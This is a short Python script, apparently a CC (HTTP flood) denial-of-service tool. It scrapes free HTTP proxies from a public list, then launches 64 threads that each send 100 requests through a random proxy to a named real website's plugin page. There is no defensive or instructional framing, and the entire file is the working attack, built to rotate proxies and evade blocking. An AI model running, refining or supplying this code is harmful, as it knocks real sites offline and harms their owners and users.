import random
from urllib import request
import threading
from bs4 import BeautifulSoup

target_url = 'http://www.rayseasc.com/plugin.php?id=ruixi:index'
proxies_url = 'https://www.kuaidaili.com/free/inha/2/'

proxies = []


def get_proxies():
    temp = request.urlopen(proxies_url)
    response = temp.read().decode('utf-8')
    soup = BeautifulSoup(response, 'html.parser')
    trs = soup.find_all('tr')
    for tr in trs:
        if tr.td is None:
            continue
        data = tr.find_all('td')
        ip = data[0].text
        port = data[1].text
        method = data[3].text
        if method == 'HTTP':
            proxies.append(ip + ':' + port)


def cc_attack():
    try:
        proxy = random.choice(proxies)
        proxy_handler = request.ProxyHandler({'http': proxy})
        opener = request.build_opener(proxy_handler)
        request.install_opener(opener)
        for i in range(100):
            request.urlopen(target_url)
    except Exception as e:
        print(e)
        return


def do_attack(thread_number=64):
    thread_pool = []
    for _ in range(thread_number):
        thread_pool.append(threading.Thread(target=cc_attack))
    for item in thread_pool:
        item.start()


if __name__ == '__main__':
    get_proxies()
    do_attack()
